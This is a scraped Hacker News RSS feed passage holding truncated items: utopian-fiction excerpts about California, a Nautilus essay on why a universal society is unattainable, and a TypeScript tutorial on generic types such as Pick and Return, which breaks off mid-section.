<p>“I hated capitalism because it was a lie!” Tom would say, fording Harding Canyon stream with abandon. “It said that everyone exercising their self-interest would make a decent community! Such a lie!” Splash, splash! “It was government as protection agency, a belief system for the rich. Why, even when it seemed to work, where did it leave them? Holed up in mansions and crazy as loons.” “But some people like to be alone.” “Yeah, yeah. And self-interest exists, no one can say it doesn’t—the governments that tried got in deep trouble, because that’s a lie of a different kind. But to say self-interest is all that exists, or that it should be given free rein! My Lord. Believe that and nothing matters but money.” “But you changed that,” Kevin would say, watching his footwork. “Yes, we did. We gave self-interest some room to work in, but we limited it. Channeled it toward the common good. That’s the job of the law, as we saw it then.” He laughed. “Legislation is a revolutionary power, boy, though it’s seldom seen as such. We used it for all it was worth, and most liked the results, except for some of the rich, who fought like wolverines to hold on to what they had. In fact that’s a fight that’s still going on. I don’t think it will ever end.”</p>
</div>
    























</section>



<section id=""><p>“We are the aristocracy of the world. But this time the revolution will bring down more than the aristocracy. Could be everything. Crumpled newspaper, compartmentalized disaster. Catastrophe by percentage points. We can avoid it, I swear we can. Must concentrate on that to be able to continue.”</p>
    





















<div><figure>



<picture data-loaded="false"><source data-srcset="https://api.culture.io/static/2021/01/03-another_country-stefan_kubicki.jpg" media="(min-width: 1000px)">
    <source data-srcset="https://api.culture.io/static/2021/01/03-another_country-stefan_kubicki.jpg, https://api.culture.io/static/2021/01/03-another_country-stefan_kubicki.jpg 2x" media="(min-width: 400px)">
    <img src="https://api.culture.io/static/2021/01/03-another_country-stefan_kubicki-50x31.jpg" data-srcset="https://api.culture.io/static/2021/01/03-another_country-stefan_kubicki-512x320.jpg, https://api.culture.io/static/2021/01/03-another_country-stefan_kubicki.jpg 2x" alt="Image" width="1024" height="640">
</picture>
            </figure></div>

</section>



<section id=""><div><p>“We can protest, I say. Pam shakes her head, mouth bitter. Picks up In’tl Herald Tribune. Southern Club defaulting on all debt. Prediction of twenty-five percent reduction in world population called optimistic by. Civil war in India, in Mexico, in. Deforestation in. World temperature up another degree Centigrade since. Species going extinct— I’ve already read it.”</p>
<p>✳︎ ✳︎ ✳︎</p>
<p>“My daily workload reminds me constantly that in fact it exists entangled in intricate webs of law. Their system is a mix, combining a communalism of the Santa Rosa model—land and public utilities owned in common, residents required to do ten hours a week of town work, a couple of town-owned businesses in operation to use all the labor available, that sort of thing—with aspects of the new federal model: residents are taxed more and more heavily as they approach the personal income cap, and they can direct 60 percent of their taxes to whatever services they support the most. Businesses based in town are subject to the same sort of graduated system. I am familiar with much of this from my years in Bishop, which has a similar system. As usual in these set-ups, the town is fairly wealthy, even if it is avoided by businesses looking for the best break possible. From all the income generated, a town share is distributed back out to the citizens, which comes to about twice the national income floor. But people still complain that it isn’t higher. Everyone wants to be a hundred. And here they believe that a properly run town could make everyone hit the cap as a matter of course. Thus there is the kind of intense involvement with town politics typical of these set-ups, government mixed with business mixed with life-styles, etc.”</p>
<p>✳︎ ✳︎ ✳︎</p>
<p>“What a cheat utopias are, no wonder people hate them. Engineer some fresh start, an island, a new continent, dispossess them, give them a new planet sure! So they don’t have to deal with our history. Ever since More they’ve been doing it: rupture, clean cut, fresh start. So the utopias in books are pocket utopias too. Ahistorical, static, why should we read them? They don’t speak to us trapped in this world as we are, we look at them in the same way we look at the pretty inside of a paperweight, snow drifting down, so what? It may be nice but we’re stuck here and no one’s going to give us a fresh start, we have to deal with history as it stands, no freer than a wedge in a crack.”</p>
</div>
    























</section>



<section id=""><p>“Must redefine utopia. It isn’t the perfect end-product of our wishes, define it so and it deserves the scorn of those who sneer when they hear the word. No. Utopia is the process of making a better world, the name for one path history can take, a dynamic, tumultuous, agonizing process, with no end. Struggle forever. Compare it to the present course of history. If you can.”</p>
    





















<div><figure>



<picture data-loaded="false"><source data-srcset="https://api.culture.io/static/2021/01/04-another_country-stefan_kubicki.jpg" media="(min-width: 1000px)">
    <source data-srcset="https://api.culture.io/static/2021/01/04-another_country-stefan_kubicki.jpg, https://api.culture.io/static/2021/01/04-another_country-stefan_kubicki.jpg 2x" media="(min-width: 400px)">
    <img src="https://api.culture.io/static/2021/01/04-another_country-stefan_kubicki-50x31.jpg" data-srcset="https://api.culture.io/static/2021/01/04-another_country-stefan_kubicki-512x320.jpg, https://api.culture.io/static/2021/01/04-another_country-stefan_kubicki.jpg 2x" alt="Image" width="1024" height="640">
</picture>
            </figure></div>

</section>



<section id=""><div><p>“Kevin listened to the wind, and looked around at the dark peaks poking into the night sky. Suddenly it was clear to him that Sally had had a reason to bring them up here to have this talk; that this place itself was part of the discourse, part of what she wanted to say. The university of the wilderness. The spine of California, the hidden source of the south’s wealth. This hard wild place.”</p>
<p>✳︎ ✳︎ ✳︎</p>
<p>“She saw the doggie look on my face, smiled. “So how’d the book go?” “The same.” It’s not fair, really. I can’t understand a word she says when she talks of her work, while for me, on this project at least, she is a crucial sounding board. “I’m thinking of alternating chapters of fiction with essay chapters which discuss the political and economic problems we need to solve.” “My God.” Wrinkled nose, as if something gone bad in fridge. “Hey, H.G. Wells did it.” “Which book?” “Well—one of the major utopian novels.” “Still in print?” “No.” “Libraries have it?” “University libraries.” “So Wells’s science fiction adventures are still in every library and bookstore, while this major utopia with the essays is long gone, and you can’t even remember the title?” I changed the subject. Think I might pass on the essays.”</p>
<p>✳︎ ✳︎ ✳︎</p>
<p>“They stepped and balanced, hopped and teetered. Occasionally they bumped together, arm to arm. Their skin was warm in the sun. They talked about this and that, and Kevin felt certain boundaries disappearing. Ramona was willing to talk about anything, now, about things beyond the present moment. Childhoods in El Modena and at the beach. The boats offshore. Their work. The people they knew. The huge rocks jumbled under them: “Where did they come from, anyway?” They didn’t know. It didn’t matter. What do you talk about when you’re falling in love? It doesn’t matter. All the questions are, Who are you? How do you think? Are you like me? Will you love me? And all the answers are, I am like this, like this, like this. I am like you. I like you.”</p>
</div>
    























</section>



<section id=""><p>Strange, this life, isn’t it? We think, nothing could ever get more real than this! Then this becomes nothing more than a darting fragmentary complex of pure mentation, while a new reality, more real than ever! steps in to obscure all previous candidates. I never get used to it.</p>
    





















<div><figure>



<picture data-loaded="false"><source data-srcset="https://api.culture.io/static/2021/01/11-another_country-stefan_kubicki.jpg" media="(min-width: 1000px)">
    <source data-srcset="https://api.culture.io/static/2021/01/11-another_country-stefan_kubicki.jpg, https://api.culture.io/static/2021/01/11-another_country-stefan_kubicki.jpg 2x" media="(min-width: 400px)">
    <img src="https://api.culture.io/static/2021/01/11-another_country-stefan_kubicki-50x31.jpg" data-srcset="https://api.culture.io/static/2021/01/11-another_country-stefan_kubicki-512x320.jpg, https://api.culture.io/static/2021/01/11-another_country-stefan_kubicki.jpg 2x" alt="Image" width="1024" height="640">
</picture>
            </figure></div>

</section>



<section id=""><div><p>“Been on plane four hours now. Liddy finally asleep. Tapping on lap keyboard. Might as well distract myself. Strategies for changing history. Invent the history leading out of this world (please) into the world of the book. Causes of utopian process gaining upper hand. Words scroll up and disappear forever, like days. Lincoln not assassinated, no, no, we know it didn’t happen that way, we know we can’t take that road. Not useful. Someone appears to lead us, no! No Great Man theory here. No individual can save us. Together or not at all. Together or nothing. Ah, Pamela— Some group. In power or out. Act together. Say lawyers, the law? Still can’t escape the feeling that there’s where a difference could be made, despite my own experience. Remake the law of the land. Say a whole class of Harvard Law School, class of ’12 goes out to fill posts of all kinds, government, World Bank, IMF, Pentagon. Save the twenty-first century. Plausible? No. A story. But at least it’s possible, I mean we could do it! Nothing stopping us but inertia, ideology. Lack of imagination! Teachers, religious leaders&nbsp;… but there are few politically active people in any group. And to agree on a whole program of action, all of them. How implausible can something be before it’s useless? It’s conspiracy theory, really. We don’t need that either. History changed by a popular book, a utopia, everyone reads it and it has ideas, or vague pokes in the direction of ideas, it changes their thinking, everyone starts working for a better world— Getting desperate. Marcuse: one of the worst signs of our danger is we can’t imagine the route from here to utopia. No way to get there. Take the first step and you’re there. Process, dynamism, the way is the life. We …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://culture.io/letters-from-a-utopian-california-part-1">https://culture.io/letters-from-a-utopian-california-part-1</a></em></p>]]>
            </description>
            <link>https://culture.io/letters-from-a-utopian-california-part-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25771117</guid>
            <pubDate>Thu, 14 Jan 2021 02:35:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why a Universal Society Is Unattainable]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25771109">thread link</a>) | @CapitalistCartr
<br/>
January 13, 2021 | http://m.nautil.us/issue/95/escape/why-a-universal-society-is-unattainable | <a href="https://web.archive.org/web/*/http://m.nautil.us/issue/95/escape/why-a-universal-society-is-unattainable">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
			<p><span>O</span>n Jan. 1, 2021, five long years after the vote for what’s become known as Brexit, and numerous marches before and after that national decision, some of which attracted more than 100,000 impassioned participants, Great Britain formally severed its nearly half century-long ties with the European Union. The decision, as columnist Owen Jones described it in <i>The Guardian</i>, was to foment “an all-out culture war.”</p><p>In the 2016 vote, the majority of British people stubbornly chose for their country to be on its own and not part of a more encompassing group of societies. The vote appeared to run against the broader trend of European nations loosening their boundaries in acknowledgement of an identity that outweighs, or erases, the impor­tance of the societies themselves. With the number of societies in gener­al declining century after century,<sup>1</sup> we might take seriously the assertion that the internationalization of culture (think <i>Star Wars</i>, tequila, Mercedes-Benz) and connections (with Twitter linking people from Aa, Estonia, to Zu, Afghanistan) are a harbinger of a Berlin Wall-type border collapse, making, as the British sociologist Morris Ginsberg once put it, “The unification of mankind [is] one of the clearest trends in human history.”<sup>2</sup></p><blockquote><p>The European Union offers no grand foundation story, no venerable symbols or traditions.</p> </blockquote><p>Whatever the ultimate relationship of Great Britain and Europe may be, the current breakup underscores how deeply national identity runs through human psychology. A review of both the psychology literature and anthropological research on societies ranging from the ethnolinguistic groups of hunter-gatherers to tribes, chiefdoms, and states (less formally, “nations”),<sup>3</sup> reveal that a universal society is unattainable. Populations across the globe today may devour Starbucks, KFC, and Coca-Cola. They may enjoy Italian opera, French couture, and Persian carpets. But no matter how many exotic influences each absorbs or what foreign connections they make, nations don’t just fade away. They retain their citizens’ fierce devotion.<sup>4</sup> Societies have always traded, gifted, or taken what they want from the outer world to claim as their own, and grown all the stronger for doing so. While the erasure of borders may be laudable, nothing we know about the workings of the human mind suggests it is a realistic vision.<br></p><p><span>T</span>hroughout history, humankind has successfully er­ected umbrella organizations composed of multiple societies. That such groups fail to supersede bonds to the societies themselves is demonstrated by the most binding association of societies in the anthropological record. In northwest Amazonia reside 20 or so tribes, or language groups, known collectively as the Tukanoans. Each has its own language or dialect, some similar, some mutually unintelligible. The tribes are tied economically, each a specialist on goods it exchanges with the others. Cross-connecting them are what amount to obligatory trade relations of a novel sort: Marriage within a tribe is improper. “Those who speak the same language with us are our brothers, and we do not marry our sisters,” the people say.<sup>5</sup> Thus a bride marries into another tribe, where she learns the local tongue.</p><p>One explanation for this arrangement is that it reduces inbreeding in small societies, an incestuous act to which <i>Homo sapiens</i> has an innate abhorrence. We see this in many nonhumans as well, such as in chimpanzees, where females avoid mating with kin by likewise transferring between communities. The psychological aversion to marrying a sibling presents a far greater problem for the Tukanoans, whose numbers have been miniscule at times in the past, than for the massive countries of today. Perhaps this fear overpowered any trepidation those people have about firmly bonding their societies. The compulsory spousal exchanges have created some of the tightest alliances ever recorded, currently totaling about 30,000 Amazonian souls. Yet for all that, Tukanoan tribes remain clear and separate, each confined to specific areas.<sup>6</sup></p><blockquote><p>If a mass hypnotist caused us to forget our differences, we would scramble to invent new ones.</p> </blockquote><p>A failure of alliances to supersede people’s affiliation to their society holds true universally. Intergovernmental organizations like the European Union and the United Nations don’t earn our primary emotional commitment because they lack ingredients that make them real for the members. The EU may be the most ambitious attempt at societal integration conceived, yet few members see the EU as an entity worthy of their loyalty the way they do their countries, and for several reasons.<br></p><p>First off, the EU’s borders are indefinite—indeed, are subject to revision as states enter or go. Additionally, its members have a history of conflict dating from the Middle Ages, and a split already exists from east to west among communist and capitalist cultures. To top all that off, the EU offers no grand foundation story, no venerable symbols or traditions, and there’s little sense anyone would fight and die for Europe as they might for their nation.<sup>7</sup> That makes the EU a political coalition much like the Iroquois Confederacy once was for six American Indian tribes, or the league of states formed within what is now China during the sixth century B.C.<sup>8</sup><br></p><p>The strength of such associations wax or wane given their value at the moment. As with our personal relationships, friends can become enemies who turn into friends again, something that’s been shown for the ever-shifting relationships among many American Indian tribes.<sup>9</sup> Each country in the EU handles passports and other issues relating to its citizens’ identity and remains the focus of their self-worth, an outlook that makes its membership secondary and disposable. Analysis of the 2016 Brexit vote shows that those who most strongly think of themselves as English went against staying with the EU. Voters saw what was intended foremost to be an economic and peacekeeping tool as a threat to their identity.<sup>10</sup> The fact is the consequences of Brexit will be mostly commercial, setting into action a myriad of obstacles to trade.<sup>11</sup></p><div>
<article>
<p><a href="http://m.nautil.us/issue/81/Maps/why-doesnt-everybody-have-dark-skin-today" data-trval="why-doesnt-everybody-have-dark-skin-today" data-trlbl="foc_rec" data-tract="internal_art">
<img src="http://static.nautil.us/16867_72c288a828485e5b1d4c52910d106734.png" alt="Sapolsky_TH-F1" width="314" height="177">
</a>
</p>


</article>
</div><p>Ironically, Britain’s relations with the EU unraveled when its self-iden­tity was under stress, with Northern Ireland and Scotland increasingly like­ly opting to secede from the UK, a fracture along ancient cultural lines that’s the norm for modern societies.<sup>12</sup> Meanwhile, the loss of Britain has invigorated the ties of the mem­ber nations to the EU, along the lines of what one sees when a group of people pull together in the face of adversity—but that doesn’t mean the divisions within the EU will disappear.<sup>13</sup></p><p>Financial and security issues hold the EU together. The same can be said for Swit­zerland, a country subject to perennial scrutiny because, as the four languages and complex territoriality of its people attest, its nationhood rests on a detailed social and political alliance between 26 local communities, or cantons. These self-governing settlements act in many respects as miniature nations nestled in a mountain landscape that enhances each one’s physical separation and autonomy.<sup>14</sup> “Each Canton has its own history, constitution and flag, and some even have an anthem,” political scientist Antoine Chollet reports, such that Swiss “citizenship refers to one who can vote and nothing more.”<sup>15</sup> Formation of the Swiss confederation required rewriting accounts of the past to maintain a sense of equality between the cantons, allowing them to survive over the centuries when they were forc­ed to negotiate their interests with far larger and more powerful neighboring countries.<sup>16</sup></p><p>The EU and Switzerland are regional entities kept intact by perceived needs to counter hazards from outsiders, a motivating factor that gives both a reasonable chance of success. An absolutely global union would have no such motivation, making it far more precarious. One possible means of attaining that unity might be to shift people’s perception of who’s an outsider. It was a point Ronald Reagan liked to make. “I occasionally think how quickly our differences worldwide would vanish if we were facing an alien threat from outside this world,” he remarked in an address to the UN. Indeed, science-fiction tales like <i>The War of the Worlds</i> depict humankind acting as one against a common enemy.</p><p>Yet even then our societies would endure the space aliens. The arrival of Martians wouldn’t make nations irrelevant any more than Europeans arriving in Australia caused the Aborigines to drop what had been several hundred clear-cut tribal groups (actually, many Aborigines first guessed that the Europeans were otherworldly, i.e., ghosts<sup>17</sup>). That would be so regardless of how much the aliens shattered the beliefs people held about their own societies, whose beloved differences would look trivial by comparison to those with the Little Green Men. Cosmopolitanism, the conviction that the diverse people of our planet will come to feel a primary connection to the human race (the term means “citizen of the cosmos”),<sup>18</sup> is a pipe dream.</p><p><span>B</span>ut what might happen if people could forgo those traits that “mark” their identities or somehow put aside the drive to categorize each other by means of such labels—to separate us from them based on language, clothing, gestures, or religious beliefs? In such a world the only reliable differences we would perceive would be between individuals—not between groups. One supposes that under such circumstances our nations would disintegrate entirely, but it’s hard to predict what would rise in their stead. Maybe our af­filiations would coalesce around local neighborhoods or around those who we know best, with the global population splintering into millions of micro-nations. We might foresee a return to the societies of our prehuman forebears, when, like chimpanzees and most other vertebrates, every individual literally had to remember everybody else in their society.</p><p>Or, by discarding our differences, or our penchant for making judgments …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://m.nautil.us/issue/95/escape/why-a-universal-society-is-unattainable">http://m.nautil.us/issue/95/escape/why-a-universal-society-is-unattainable</a></em></p>]]>
            </description>
            <link>http://m.nautil.us/issue/95/escape/why-a-universal-society-is-unattainable</link>
            <guid isPermaLink="false">hacker-news-small-sites-25771109</guid>
            <pubDate>Thu, 14 Jan 2021 02:34:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A different view of TypeScript's type system]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25771060">thread link</a>) | @fwouts
<br/>
January 13, 2021 | https://fwouts.com/articles/typescript-generic-types | <a href="https://web.archive.org/web/*/https://fwouts.com/articles/typescript-generic-types">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>In my quest for designing a universal representation of code across all programming languages, I've been trying to build a deeper understanding of advanced language features. One feature that stands out is TypeScript's advanced type system, which allows types to be computed from other types. First, let's go through a quick intro, then we'll see how it could be interpreted in a different way.</p>
<h2>Introduction to TypeScript</h2>
<p><a href="https://www.typescriptlang.org/" target="_blank" rel="nofollow noopener noreferrer">TypeScript</a> is a powerful type system for JavaScript. It lets you catch issues early in the development process, such as accessing the wrong property of an object or passing an invalid function argument:</p>
<div data-language="typescript"><pre><code><span>type</span> User <span>=</span> <span>{</span>
  name<span>:</span> <span>string</span><span>,</span>
  login<span>:</span> <span>string</span><span>,</span>
  age<span>:</span> <span>number</span><span>,</span>
  comments<span>:</span> Comment<span>[</span><span>]</span>
<span>}</span><span>;</span>

<span>function</span> <span>greet</span><span>(</span><span>user<span>:</span> User</span><span>)</span> <span>{</span>
  <span>alert</span><span>(</span><span><span>`</span><span>Hi </span><span><span>${</span>user<span>.</span>firstName<span>}</span></span><span>!</span><span>`</span></span><span>)</span><span>;</span>
  
<span>}</span>

<span>greet</span><span>(</span><span>"Bob"</span><span>)</span><span>;</span>
</code></pre></div>
<p>TypeScript offers advanced features such as string literal types and unions. Here is an example in action:</p>
<div data-language="typescript"><pre><code><span>type</span> Color <span>=</span> <span>'white'</span> <span>|</span> <span>'red'</span> <span>|</span> <span>'green'</span> <span>|</span> <span>'yellow'</span> <span>|</span> <span>'blue'</span> <span>|</span> <span>'black'</span><span>;</span>

<span>function</span> <span>fill</span><span>(</span><span>color<span>:</span> Color</span><span>)</span> <span>{</span>
  
<span>}</span>

<span>fill</span><span>(</span><span>'green'</span><span>)</span><span>;</span>


<span>fill</span><span>(</span><span>'rainbow'</span><span>)</span><span>;</span>
</code></pre></div>
<h2>Generic types in TypeScript</h2>
<p>What makes TypeScript particularly useful is its support for generic types, which let you manipulate and transform types.</p>
<p>Here is one example with the generic type <code>Pick</code> from the <a href="https://www.typescriptlang.org/docs/handbook/advanced-types.html" target="_blank" rel="nofollow noopener noreferrer">official docs</a>. <code>Pick</code> allows you to define a type that has specific keys in common with another type. This can be useful when you want to make sure that two types stay consistent with each other:</p>
<div data-language="typescript"><pre><code><span>type</span> Pick<span>&lt;</span><span>T</span><span>,</span> <span>K</span> <span>extends</span> <span>keyof</span> <span>T</span><span>&gt;</span> <span>=</span> <span>{</span>
  <span>[</span><span>P</span> <span>in</span> <span>K</span><span>]</span><span>:</span> <span>T</span><span>[</span><span>P</span><span>]</span><span>;</span>
<span>}</span><span>;</span>

<span>type</span> User <span>=</span> <span>{</span>
  name<span>:</span> <span>string</span><span>,</span>
  login<span>:</span> <span>string</span><span>,</span>
  age<span>:</span> <span>number</span><span>,</span>
  comments<span>:</span> Comment<span>[</span><span>]</span>
<span>}</span><span>;</span>

<span>type</span> UserPreview <span>=</span> Pick<span>&lt;</span>User<span>,</span> <span>'name'</span> <span>|</span> <span>'age'</span><span>&gt;</span><span>;</span>


<span>type</span> UserPreview <span>=</span> <span>{</span>
  name<span>:</span> <span>string</span><span>,</span>
  age<span>:</span> <span>number</span>
<span>}</span><span>;</span></code></pre></div>
<h2>Explaining the Pick generic type</h2>
<p>TypeScript's type manipulation syntax can be quite difficult to grasp. If you're struggling to understand what <code>Pick</code> does, you're not alone.</p>
<p>Let's decompose it to understand exactly what it does:</p>
<ol>
<li><code>Pick&lt;T, K&gt;</code> means that <code>Pick</code> expects two type parameters which we name <code>T</code> and <code>K</code>. We could just as well have named them <code>Foo</code> and <code>Bar</code> if we wanted to. Using single-letter type names is only a convention.</li>
<li><code>K extends keyof T</code> means that a type passed as <code>K</code> must be a subset of the type of keys of <code>T</code> (<a href="https://www.typescriptlang.org/docs/handbook/generics.html#generic-constraints" target="_blank" rel="nofollow noopener noreferrer">see generic constraints</a>).</li>
<li><code>[P in K]: X</code> means that for each possible value <code>P</code> in <code>K</code>, we declare a property <code>P</code> of type <code>X</code> (<a href="https://www.typescriptlang.org/docs/handbook/advanced-types.html#mapped-types" target="_blank" rel="nofollow noopener noreferrer">see mapped types</a>).</li>
<li><code>T[P]</code> means that we look up the type of the property <code>P</code> of type <code>T</code> (<a href="https://www.typescriptlang.org/docs/handbook/2/indexed-access-types.html" target="_blank" rel="nofollow noopener noreferrer">see indexed access types</a>).</li>
</ol>
<p>In our example, we invoked <code>Pick&lt;User, 'name' | 'age'&gt;</code> which means:</p>
<div data-language="typescript"><pre><code><span>T</span> <span>=</span> User
<span>K</span> <span>=</span> <span>'name'</span> <span>|</span> <span>'age'</span>
<span>keyof</span> <span>T</span> <span>=</span> <span>'name'</span> <span>|</span> <span>'login'</span> <span>|</span> <span>'age'</span> <span>|</span> <span>'comments'</span></code></pre></div>
<p><code>K</code> is indeed a subset of <code>keyof T</code>, so the condition specified in (2) is satisfied.</p>
<p>The possible values of <code>P</code> are <code>'name'</code> and <code>'age'</code> so:</p>
<div data-language="typescript"><pre><code><span>type</span> UserPreview <span>=</span> <span>{</span>
  <span>[</span><span>'name'</span><span>]</span><span>:</span> User<span>[</span><span>'name'</span><span>]</span><span>,</span>
  <span>[</span><span>'age'</span><span>]</span><span>:</span> User<span>[</span><span>'age'</span><span>]</span>
<span>}</span><span>;</span></code></pre></div>
<p>Since <code>User['name']</code> is <code>string</code> and <code>User['age']</code> is <code>number</code>, the resulting type is indeed:</p>
<div data-language="typescript"><pre><code><span>type</span> UserPreview <span>=</span> <span>{</span>
  <span>[</span><span>'name'</span><span>]</span><span>:</span> <span>string</span><span>,</span>
  <span>[</span><span>'age'</span><span>]</span><span>:</span> <span>number</span>
<span>}</span><span>;</span></code></pre></div>
<p>This is equivalent to what we had earlier:</p>
<div data-language="typescript"><pre><code><span>type</span> UserPreview <span>=</span> <span>{</span>
  name<span>:</span> <span>string</span><span>,</span>
  age<span>:</span> <span>number</span>
<span>}</span><span>;</span></code></pre></div>
<h2>The Return generic type</h2>
<p>Here is another example. <code>Return&lt;T&gt;</code> lets you extract the return type of a function:</p>
<div data-language="typescript"><pre><code><span>type</span> Return<span>&lt;</span><span>T</span><span>&gt;</span> <span>=</span> <span>T</span> <span>extends</span> <span>(</span><span><span>...</span>args<span>:</span> <span>any</span><span>[</span><span>]</span></span><span>)</span> <span>=&gt;</span> infer <span>R</span> <span>?</span> <span>R</span> <span>:</span> <span>never</span><span>;</span></code></pre></div>
<p>Let's decompose this one:</p>
<ul>
<li><code>Return&lt;T&gt;</code> means that it expects a single type parameter.</li>
<li><code>T extends X ? A : B</code> means that that if <code>T</code> "extends" <code>X</code>, the generic type will return <code>A</code>, otherwise <code>B</code> (<a href="https://www.typescriptlang.org/docs/handbook/release-notes/typescript-2-8.html#conditional-types" target="_blank" rel="nofollow noopener noreferrer">see conditional type</a>).</li>
<li><code>(...args: any[]) =&gt; infer R</code> represents any function (any number of arguments of any type). The <code>infer</code> keyword here allows us to refer to the function's return type as <code>R</code> (<a href="https://www.typescriptlang.org/docs/handbook/release-notes/typescript-2-8.html#type-inference-in-conditional-types" target="_blank" rel="nofollow noopener noreferrer">see inferred types</a>).</li>
<li><code>never</code> is a type of values that never occur. There are no possible values of type <code>never</code>, not even <code>null</code> or <code>undefined</code> (<a href="https://www.typescriptlang.org/docs/handbook/basic-types.html#never" target="_blank" rel="nofollow noopener noreferrer">see basic types</a>).</li>
</ul>
<p>If we pass it a function type, we'll get its return type:</p>
<div data-language="typescript"><pre><code><span>function</span> <span>f</span><span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>123</span><span>;</span>
<span>}</span>

<span>type</span> Example <span>=</span> Return<span>&lt;</span><span>typeof</span> f<span>&gt;</span><span>;</span>


<span>type</span> Example <span>=</span> <span>number</span><span>;</span></code></pre></div>
<p>On the other hand if we pass it a type that doesn't represent a function, we'll get <code>never</code>:</p>
<div data-language="typescript"><pre><code><span>type</span> Example <span>=</span> Return<span>&lt;</span><span>number</span><span>&gt;</span><span>;</span>  </code></pre></div>
<p>The examples we've just seen are, perhaps surprisingly, fairly simple generic types. It can get complicated quite quickly, to the point where <a href="https://github.com/type-challenges/type-challenges" target="_blank" rel="nofollow noopener noreferrer">TypeScript challenges have emerged</a>. In fact, TypeScript's type system is powerful enough to be <a href="https://github.com/microsoft/TypeScript/issues/14833" target="_blank" rel="nofollow noopener noreferrer">Turing Complete</a>.</p>
<h2>A different perspective</h2>
<p>As part of my research into <a href="https://fwouts.com/projects" target="_blank" rel="nofollow noopener noreferrer">Graphene</a>, I started exploring the meaning of generic types a little deeper. One particular analogy I wanted to explore was the difference between functions and generic types. Can we see types as values, and generic types as type-level functions?</p>
<h3>Types as values</h3>
<p>First, it's worth noting that a type definition looks a lot like a value. Notice the similarity between:</p>
<p><em>A variable assignment in JavaScript</em></p>
<div data-language="typescript"><pre><code><span>let</span> user <span>=</span> <span>{</span>
  name<span>:</span> <span>"Bob"</span><span>,</span>
  login<span>:</span> <span>"robert"</span><span>,</span>
  age<span>:</span> <span>30</span><span>,</span>
  comments<span>:</span> <span>[</span><span>]</span>
<span>}</span></code></pre></div>
<p><em>A corresponding type declaration in TypeScript</em></p>
<div data-language="typescript"><pre><code><span>type</span> User <span>=</span> <span>{</span>
  name<span>:</span> <span>string</span><span>,</span>
  login<span>:</span> <span>string</span><span>,</span>
  age<span>:</span> <span>number</span><span>,</span>
  comments<span>:</span> Comment<span>[</span><span>]</span>
<span>}</span><span>;</span></code></pre></div>
<p>We can think of <code>User</code> as a value, which is composed of other values such as <code>string</code>, <code>number</code> and <code>Comment[]</code>. They all belong to the same "space of types". Unlike JavaScript values, which exist at runtime, type values exist at compile time.</p>
<h3>Generic types as functions</h3>
<p>Next, let's look at generic types. Could we think of them as functions?</p>
<h4>Pick&lt;T, K&gt; as a function</h4>
<p>Let's look at our <code>Pick</code> example from earlier:</p>
<div data-language="typescript"><pre><code><span>type</span> Pick<span>&lt;</span><span>T</span><span>,</span> <span>K</span> <span>extends</span> <span>keyof</span> <span>T</span><span>&gt;</span> <span>=</span> <span>{</span>
  <span>[</span><span>P</span> <span>in</span> <span>K</span><span>]</span><span>:</span> <span>T</span><span>[</span><span>P</span><span>]</span><span>;</span>
<span>}</span><span>;</span></code></pre></div>
<p>If we consider types to be values, we could actually represent <code>Pick</code> as a function. Here is what that could look like, inspired from JavaScript's function syntax:</p>
<div data-language="typescript"><pre><code><span>type</span> <span>function</span> <span>Pick</span><span>(</span><span><span>T</span><span>,</span> <span>K</span></span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>K</span><span>.</span><span>extends</span><span>(</span><span>keyof</span><span>(</span><span>T</span><span>)</span><span>)</span><span>)</span> <span>{</span>
    <span>throw</span> <span>new</span> <span>Error</span><span>(</span><span>"K does not extend keyof T"</span><span>)</span><span>;</span>
  <span>}</span>
  <span>return</span> <span>{</span>
    <span>...</span><span>K</span><span>.</span><span>map</span><span>(</span><span><span>P</span></span> <span>=&gt;</span> <span>property</span><span>(</span><span>P</span><span>,</span> <span>T</span><span>.</span><span>getPropertyType</span><span>(</span><span>P</span><span>)</span><span>)</span><span>)</span><span>;</span>
  <span>}</span><span>;</span>
<span>}</span></code></pre></div>
<p>Even better, we could get rid of the clumsy <code>throw</code> statement and use type annotations to describe the types <code>T</code> and <code>K</code>:</p>
<div data-language="typescript"><pre><code><span>type</span> <span>function</span> <span>Pick</span><span>(</span><span><span>T</span><span>:</span> AnyType<span>,</span> <span>K</span><span>:</span> <span>keyof</span> <span>T</span></span><span>)</span> <span>{</span>
  <span>return</span> <span>{</span>
    <span>...</span><span>K</span><span>.</span><span>map</span><span>(</span><span><span>P</span></span> <span>=&gt;</span> <span>property</span><span>(</span><span>P</span><span>,</span> <span>T</span><span>.</span><span>getPropertyType</span><span>(</span><span>P</span><span>)</span><span>)</span><span>)</span><span>;</span>
  <span>}</span><span>;</span>
<span>}</span></code></pre></div>
<p>Let's look at an invocation of our <code>Pick</code> function:</p>
<div data-language="typescript"><pre><code><span>Pick</span><span>(</span>User<span>,</span> <span>'name'</span> <span>|</span> <span>'age'</span><span>)</span>



<span>{</span>
  <span>...</span><span>(</span><span>'name'</span> <span>|</span> <span>'age'</span><span>)</span><span>.</span><span>map</span><span>(</span><span><span>P</span></span> <span>=&gt;</span> <span>property</span><span>(</span><span>P</span><span>,</span> User<span>.</span><span>getPropertyType</span><span>(</span><span>P</span><span>)</span><span>)</span><span>)</span>
<span>}</span>



<span>{</span>
  name<span>:</span> User<span>[</span><span>'name'</span><span>]</span><span>,</span>
  age<span>:</span> User<span>[</span><span>'age'</span><span>]</span>
<span>}</span>



<span>{</span>
  name<span>:</span> <span>string</span><span>,</span>
  age<span>:</span> <span>number</span>
<span>}</span></code></pre></div>
<p>This produces exactly the type we expected.</p>
<h4>Return&lt;T&gt; as a function</h4>
<p>Now let's look at our <code>Return</code> type:</p>
